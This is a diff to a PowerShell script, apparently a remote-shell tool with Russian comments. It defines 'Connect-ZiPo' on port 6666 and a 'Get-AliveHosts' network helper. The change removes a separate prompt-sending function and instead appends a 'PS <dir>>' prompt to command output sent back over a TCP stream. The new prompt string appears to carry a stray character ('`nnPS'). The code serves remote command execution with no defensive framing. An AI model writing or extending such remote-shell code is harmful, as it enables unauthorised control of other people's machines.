@@ -5,19 +5,7 @@ function Connect-ZiPo {
     $port = 6666
     $currentDir = Get-Location
 
-        # Функция для отправки сообщения prompt клиенту
-    function Send-Prompt {
-        param(
-            [System.IO.Stream]$stream,
-            [string]$dir
-        )
-        $promptMsg = "PROMPT::$dir"
-        $promptBytes = [Text.Encoding]::UTF8.GetBytes($promptMsg + "`n")
-        $stream.Write($promptBytes, 0, $promptBytes.Length)
-        $stream.Flush()
-    }
 
-    
     function Get-AliveHosts {
     param(
         [System.Net.Sockets.NetworkStream]$stream
@@ -458,16 +446,13 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                # Отправляем результат выполнения команды (если он не пустой)
-                if ($response -ne "") {
-                    $responseBytes = [Text.Encoding]::UTF8.GetBytes($response + "`n")
-                    $stream.Write($responseBytes, 0, $responseBytes.Length)
-                    $stream.Flush()
-                }
-                
-                # Отправляем обновлённый prompt клиенту
-                Send-Prompt -stream $stream -dir $currentDir
-                            }
+                # Обновлённое добавление приглашения:
+                $response = ($response.TrimEnd() + "`nnPS $currentDir> ")
+
+                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
+                $stream.Write($outBytes, 0, $outBytes.Length)
+                $stream.Flush()
+            }
 
             $stream.Close()
             $tcp.Close()
